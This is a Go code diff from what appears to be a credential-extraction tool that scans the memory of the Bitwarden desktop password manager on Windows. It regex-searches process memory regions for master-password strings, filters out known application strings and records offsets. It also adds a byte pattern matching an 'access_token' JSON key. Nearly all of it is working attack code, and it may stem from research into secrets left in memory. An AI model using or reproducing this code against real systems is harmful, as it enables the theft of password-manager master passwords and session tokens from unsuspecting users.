@@ -18,9 +18,7 @@ import (
 var chromiumExtFontPattern = []byte{0x66, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x2d, 0x00, 0x66, 0x00, 0x61, 0x00, 0x63, 0x00, 0x65, 0x00}
 var desktopAppFontPattern = []byte{0x2f, 0x66, 0x6f, 0x6e, 0x74, 0x73, 0x2f, 0x4f, 0x70, 0x65, 0x6e, 0x5f, 0x53, 0x61, 0x6e, 0x73, 0x2d, 0x6e, 0x6f, 0x72, 0x6d, 0x61, 0x6c, 0x2d, 0x38, 0x30, 0x30, 0x2e, 0x77, 0x6f, 0x66, 0x66}
 var desktopAppCSSPattern = []byte{0x6c, 0x32, 0x2d, 0x70, 0x6f, 0x70, 0x75, 0x70, 0x2e, 0x73, 0x77, 0x61, 0x6c, 0x32, 0x2d, 0x74, 0x6f, 0x61, 0x73, 0x74, 0x7b, 0x66, 0x6c, 0x65, 0x78, 0x2d, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x63, 0x6f, 0x6c, 0x75, 0x6d, 0x6e, 0x3b, 0x61, 0x6c, 0x69, 0x67, 0x6e}
-
-// Characters ^T REMOVE THIS
-var bwDesktopPattern = []byte{0x5e, 0x54}
+var testingPattern = []byte{0x7b, 0x22, 0x61, 0x63, 0x63, 0x65, 0x73, 0x73, 0x5f, 0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x22, 0x3a}
 
 func getFilteredProcs(procList []*process.Process) ([]*targetProc, error) {
 	// Create empty slice of struct pointers.
@@ -102,109 +100,66 @@ func searchProcessMemory(pid int, exe string) ([][]*resultStrings, error) {
 func getBWDesktopByteStrings(pid int, mem []byte, mbi win32.MemoryBasicInformation) []*resultStrings {
 
 	// Check if known bytes exsits within memory region
-	if bytes.Contains(mem, desktopAppFontPattern) || bytes.Contains(mem, desktopAppCSSPattern) {
+	//if bytes.Contains(mem, desktopAppFontPattern) || bytes.Contains(mem, desktopAppCSSPattern) || bytes.Contains(mem, testingPattern) {
+	out := []*resultStrings{}
 
-		out := []*resultStrings{}
+	// Uses a regex pattern to find strings (only ASCII characters)
+	// Note: when submitting a password with copy and paste, forces the
+	// app to store the password using Windows UTF-16 (includes 0x00)
+	r, err := regexp.Compile(BWDesktopRegexBytePattern)
+	if err != nil {
+		fmt.Printf("[!] Offset not found")
+	}
 
-		// Uses a regex pattern to find strings (only ASCII characters)
-		// Note: when submitting a password with copy and paste, forces the
-		// app to store the password using Windows UTF-16 (includes 0x00)
-		r, err := regexp.Compile(BWDesktopRegexBytePattern)
-		if err != nil {
-			fmt.Printf("[!] Offset not found")
+	// Finds only the first occurance
+	//patternOffsetAddr := r.FindIndex(mem)
+
+	// Finds multiple occurances
+	patternOffsetAddrBetter := r.FindAllIndex(mem, -1) // -1 specifies the end of object/bytes
+
+	//fmt.Printf("[+] Offset: (0x%x)\n", passOffset)
+	if len(patternOffsetAddrBetter) != 0 {
+		fmt.Printf("[+] Found initial pattern\n")
+		fmt.Printf("[+] Memory region: 0x%x - 0x%x\n", mbi.BaseAddress, mbi.BaseAddress+mbi.RegionSize)
+		fmt.Printf("[+] Region size: 0x%x\n", mbi.RegionSize)
+		// Print the number of hits
+		fmt.Printf("[+] No. of hits: %d \n\n", len(patternOffsetAddrBetter))
+
+		for i, val := range patternOffsetAddrBetter {
+			//fmt.Printf("Index: %d = %x\n", i, v[0])
+			str := bytes.NewBuffer(mem[val[0]+4 : val[1]]).String() // start after the password prefix
+			isDefaultStr := false
+
+			for _, str2 := range StaticBWStrings {
+				// Exclude known Bitwarden strings
+				if strings.Contains(str, str2) {
+					isDefaultStr = true
+					break
+				}
+			}
+
+			if isDefaultStr {
+				continue
+			}
+			if verboseOption {
+				fmt.Printf("%s\n", str) // show all the strings matched
+			}
+
+			item := new(resultStrings)
+			item.memRegion = uint64(mbi.BaseAddress)
+			item.memSize = int32(mbi.RegionSize)
+			item.index = i
+			item.startOffset = val[0]
+			item.endOffset = val[1]
+			item.str = str
+
+			out = append(out, item)
+			//fmt.Printf("Index: %d with Offset: 0x%x = %s\n", i, v[0], str3)
+
 		}
 
-		// Finds only the first occurance
-		//patternOffsetAddr := r.FindIndex(mem)
+		return out
 
-		// Finds multiple occurances
-		patternOffsetAddrBetter := r.FindAllIndex(mem, -1) // -1 specifies the end of object/bytes
-
-		//fmt.Printf("[+] Offset: (0x%x)\n", passOffset)
-		if len(patternOffsetAddrBetter) != 0 {
-			fmt.Printf("[+] Found initial pattern\n")
-			fmt.Printf("[+] Memory region: 0x%x - 0x%x\n", mbi.BaseAddress, mbi.BaseAddress+mbi.RegionSize)
-			fmt.Printf("[+] Region size: 0x%x\n", mbi.RegionSize)
-			// Print the number of hits
-			fmt.Printf("[+] No. of hits: %d \n\n", len(patternOffsetAddrBetter))
-
-			for i, v := range patternOffsetAddrBetter {
-				//fmt.Printf("Index: %d = %x\n", i, v[0])
-				str := bytes.NewBuffer(mem[v[0]+4 : v[1]]).String() // start after the password prefix
-
-				if verboseOption {
-					fmt.Printf("%s\n", str) // show all the strings matched
-				}
-
-				item := new(resultStrings)
-				item.memRegion = int32(mbi.BaseAddress)
-				item.memSize = int32(mbi.RegionSize)
-				item.index = i
-				item.startOffset = v[0]
-				item.endOffset = v[1]
-				item.str = str
-
-				out = append(out, item)
-				//fmt.Printf("Index: %d with Offset: 0x%x = %s\n", i, v[0], str3)
-
-			}
-
-			return out
-
-		} else {
-
-			return nil
-
-		}
-
-		//str3 := bytes.NewBuffer(mem[passOffset : passOffset+21]) // static passlen
-		//fmt.Printf("[+] Raw memory: %s\n", str3)
-		//fmt.Printf("[!] --------- TESTING ---------\n")
-
-		/* if len(patternOffsetAddr) != 0 {
-			fmt.Printf("[+] 2nd pattern address: (0x%x)\n", mbi.BaseAddress+win32.ULONGLONG(patternOffsetAddr[0]))
-
-			// Write memory regions to a file
-			if dumpMemoryOption {
-				writeMemoryRegions(pid, mbi.BaseAddress, mem)
-			}
-
-			// Works on win 10 and 11 with latest Bitwarden Desktop but could be improved
-			// Search for nulls/non-ASCII character as terminators to try to get len of pass
-			r2, _ := regexp.Compile(`\x00|([^\x20-\x7E])`)
-
-			passOffset := patternOffsetAddr[0] + 4
-			//passOffsetTest := patternOffsetAddr[0]
-			/*
-				fmt.Printf("[+] Offset: (0x%x)\n", passOffset)
-				fmt.Printf("[!] --------- TESTING ---------\n")
-				str3 := bytes.NewBuffer(mem[passOffset : passOffset+21]) // static passlen
-				fmt.Printf("[+] Raw memory: %s\n", str3)
-				fmt.Printf("[!] --------- TESTING ---------\n")
-
-
-			passEndOffset := r2.FindIndex(mem[passOffset:])
-
-			// Bitwarden web registeration has a minimum 8 characters
-			// for master passwords
-			if passEndOffset[0] >= 8 {
-				//str2 := bytes.NewBuffer(mem[passOffset-15 : passOffset])
-				str := bytes.NewBuffer(mem[passOffset : passOffset+passEndOffset[0]]).String()
-				//  Filter out non-ASCII characters (sorry for non-english support)
-				if isASCII(str) {
-					fmt.Printf("[+] Password recovered: %q\n\n", str)
-					// Stop searching when found
-					//syscall.Exit(0)
-				} else {
-					fmt.Printf("[!] Contains non-ASCII characters, skipping...\n")
-				}
-			} else {
-				fmt.Printf("[!] Invalid offset size (%d), skipping...\n\n", passEndOffset[0])
-			}
-
-		} else {
-			fmt.Printf("[!] Password not found :(\n\n")
-		} */
 	}
 
 	return nil
